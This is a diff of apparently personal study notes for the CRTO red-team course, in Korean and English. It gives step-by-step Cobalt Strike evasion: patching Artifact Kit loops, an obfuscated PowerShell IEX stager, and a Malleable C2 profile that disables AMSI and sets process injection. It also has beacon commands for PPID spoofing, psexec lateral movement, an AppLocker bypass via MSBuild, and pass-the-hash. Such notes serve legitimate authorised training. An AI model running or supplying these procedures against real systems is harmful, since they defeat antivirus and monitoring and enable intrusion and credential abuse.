@@ -1,8 +1,7 @@
+# Certified Red Team Operator (CRTO)
 - Course Link : https://www.zeropointsecurity.co.uk/course/red-team-ops
 - Notion Link : https://www.notion.so/yallussallu/CRTO-2df206d737ba80f494edf2aa5730bdea?source=copy_link
-
-## WorkFlow
-https://miro.com/app/board/uXjVGBzFvek=/
+- WorkFlow : https://miro.com/app/board/uXjVGBzFvek=/
 
 ## MISC
 ```
@@ -21,19 +20,73 @@ powershell -nop -enc [BASE64_PAYLOAD]
 powershell -NoP -W H -ep ByP -e [BASE64_PAYLOAD]
 ```
 
-## Malleable C2 Profile
+## Defence Evasion
+### Artifact Kit
+- Artifact folder : C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
 ```
-# Access team server with ssh (팀 서버 SSH 접근)
+## Step 1. patch.c의 45번째 줄 : for -> while 문으로 수정 (for svc exe payloads)
+x = length;
+while(x--) {
+  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
+}
+
+## Step 2. patch.c의 116번째 줄 for문 → while 문으로 수정 (for normal exe payloads)
+int x = length;
+while(x--) {
+  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
+}
+
+## Step 3. mailslot bypass template을 사용하여 artifact 제작
+### ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
+attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
+attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts
+
+## Step 4. Load artifact.cna
+
+## Step 5. 페이로드 제작 후 Anti-Virus에 의해 탐지되는 지 확인
+PS C:\Tools\ThreatCheck\ThreatCheck\bin\Debug> .\ThreatCheck.exe -f C:\Payloads\dns_x64.svc.exe
+```
+### Resource Kit
+- Resource folder : C:\Tools\cobaltstrike\arsenal-kit\kits\resource
+```
+## Step 1. Build Resource kit
+attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
+attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource$ ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources
+
+## Step 2. template.x64.ps1의 5번째 줄 코드 수정
+`.Equals('System.dll')` → `.Equals('Sys'+'tem.dll')`
+
+## Step 3. template.x64.ps1의 32번째 줄 코드 수정
+$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
+$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)
+
+## Step 4. compress.ps1 난독화
+### %%DATA%% 는 난독화되지 않도록 해야함
+PS> ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
+PS> Invoke-Obfuscation
+Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
+Invoke-Obfuscation> TOKEN\ALL\1
+
+### compress.ps1 예시
+SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();
+
+## Step 5. Load resources.cna
+
+## Step 6. 페이로드 제작 후 Anti-Virus에 의해 탐지되는 지 확인
+PS C:\Tools\ThreatCheck\ThreatCheck\bin\Debug> .\ThreatCheck.exe -f C:\Payloads\New\dns_x64.ps1
+
+## Step 7. 만약 탐지된다면, Artifact Kit 내의 script_template.cna 파일에서 모든 rundll32.exe를 dllhost.exe로 치환
+```
+### Malleable C2 Profile
+- Malleable C2 Profile 경로 : /opt/cobaltstrike/profiles/default.profile
+- 예시
+	- https://github.com/threatexpress/malleable-c2
+	- https://github.com/rsmudge/Malleable-C2-Profiles
+```
+## Step 1. Access team server with ssh (팀 서버 SSH 접근)
 PS> ssh attacker@10.0.0.5
 
-# Modify Malleable C2 Profile
-attacker@ubuntu:~$ vi /opt/cobaltstrike/profiles/default.profile
-
-# Restart team server (팀 서버 재시작)
-attacker@ubuntu:~$ sudo /usr/bin/docker restart cobaltstrike-cs-1
-```
-
-```
+## Step 2. Malleable C2 Profile 수정
 set sample_name "Amy Profile";
 set sleeptime "2000";  # 2 Seconds
 set jitter    "30";
@@ -41,38 +94,55 @@ set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHT
 set host_stage "true"; 
 
 stage {
-        set userwx "false"; 
-        set module_x64 "Hydrogen.dll";
-        set copy_pe_header "false";
+	set userwx "false"; 
+	set module_x64 "Hydrogen.dll";
+	set copy_pe_header "false";
 }
 
 post-ex {
-        set amsi_disable "true";
-        set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
-        set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
-        set cleanup "true"; 
-        set obfuscate "true";
-        
-        transform-x64 {
-		        strrep "ReflectiveLoader" "NetlogonMain";
-		        strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
-		        strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
-		}
+	set pipename "Winsock2\\CatalogChangeListener-###-0,";
+	set amsi_disable "true";
+	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
+	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
+	set cleanup "true"; 
+	set obfuscate "true";
+	set smartinject "true";
+	
+	transform-x64 {
+		strrep "ReflectiveLoader" "NetlogonMain";
+		strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
+		strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
+	}
 }
 
 process-inject {
-		execute {
-				NtQueueApcThread-s;
-				NtQueueApcThread;
-				SetThreadContext;
-				RtlCreateUserThread;
-				CreateThread;
-		}
+	execute {
+		NtQueueApcThread-s;
+		NtQueueApcThread;
+		SetThreadContext;
+		RtlCreateUserThread;
+		CreateThread;
+	}
 }
-```
-- https://github.com/threatexpress/malleable-c2
-- https://github.com/rsmudge/Malleable-C2-Profiles
 
+## Step 3. Restart team server (팀 서버 재시작)
+attacker@ubuntu:~$ sudo /usr/bin/docker restart cobaltstrike-cs-1
+```
+### OPSEC
+```
+# Fork and run 이전에 context에 맞게 spawnto 대상을 지정해야 한다.
+beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
+beacon> powerpick Start-Sleep -s 60
+
+# jump psexec[64] 실행 전에 context에 맞게 ak-settings 대상을 지정해야 한다.
+beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
+beacon> jump psexec64 lon-ws-1 smb
+
+# PPID Spoofing : Beacon이 임의의 부모 프로세스 아래에서 프로세스를 생성할 수 있게 하여 보안 솔루션 탐지 우회
+beacon> ppid 6648
+beacon> spawnto x64 C:\Windows\System32\msiexec.exe
+beacon> powerpick Start-Sleep -s 60
+```
 ## Bypass AppLocker
 ### Enumerate
 ```
@@ -194,7 +264,7 @@ beacon> powerpick $ExecutionContext.SessionState.LanguageMode
 FullLanguage
 
 ## Step 2. PowerPick의 CLM이 FullLanguage 라면 그냥 실행
-PS> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
+beacon> powerpick C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
 
 # Case-2 : ConstrainedLanguage 에서 DLL 실행하는 방법
 ## Step 1. PowerShell CLM 확인
@@ -773,7 +843,7 @@ beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe hash /use
 ```
 ### Pass the Hash
 ```
-beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889 
+beacon> pth CONTOSO\rsteel fc525c9683e8fe067095ba2ddc971889
 ```
 ### Requesting TGT (Over Pass the Hash)
 ```
